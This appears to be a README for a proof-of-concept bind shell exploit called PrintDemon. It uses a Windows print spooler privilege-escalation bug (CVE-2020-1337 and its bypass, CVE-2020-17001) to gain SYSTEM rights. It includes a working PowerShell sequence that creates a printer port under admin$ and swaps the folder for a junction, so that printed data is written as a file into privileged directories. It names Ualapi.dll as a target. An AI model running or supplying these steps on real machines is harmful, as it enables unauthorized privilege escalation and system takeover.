# PrintDemon
This is an bind shell PoC using [PrintDemon](https://github.com/ionescu007/PrintDemon). This script is using the latest bypass for CVE-2020-1337, which is [CVE-2020-17001](https://bugs.chromium.org/p/project-zero/issues/detail?id=2075) for privilege escalation. The vulnerability allows an unprivileged user to gain system-level privileges and is based on @ionescu007 PoC.

Platform: Windows 10 1909, doesn’t work directly on 2004.

One way of exploiting this on Windows 10 2004 is to understand that FileNormalizedNameInformation will fail if the new path after the mount point is not under the root directory of the server. For example the admin$ share points to c:\windows. If you set the mount point to write to c:\Program Files then the normalization process will fail and the original string returned. This allows you to write to anywhere outside the windows directory by placing a mount point somewhere like system32\tasks. For example the following script will write the DLL to the root of Program Files.
```
mkdir "C:\windows\system32\tasks\test"

Add-PrinterDriver -Name "Generic / Text Only" 

Add-PrinterPort -Name "\\localhost\admin$\system32\tasks\test\test.dll" 

Add-Printer -Name "PrinterExploit" -DriverName "Generic / Text Only" -PortName "\\localhost\admin$\system32\tasks\test\test.dll"

rmdir "C:\windows\system32\tasks\test"

New-Item -ItemType Junction -Path "C:\windows\system32\tasks\test" -Value "C:\Program Files"

"TESTTEST" | Out-Printer -Name "PrinterExploit"

```

__Note__: This is a proof of concept. We have encountered some issues with printing to C:\Windows\System32\Ualapi.dll on some machines. We have not yet isolated what is causing this.

## Code Borrowed from
https://github.com/ionescu007/PrintDemon

https://github.com/BC-SECURITY/Invoke-PrintDemon

https://bugs.chromium.org/p/project-zero/issues/detail?id=2075

https://stackoverflow.com/questions/4442122/send-raw-zpl-to-zebra-printer-via-usb

https://stackoverflow.com/questions/29759854/how-to-connect-to-tcp-socket-with-powershell-to-send-and-receive-data
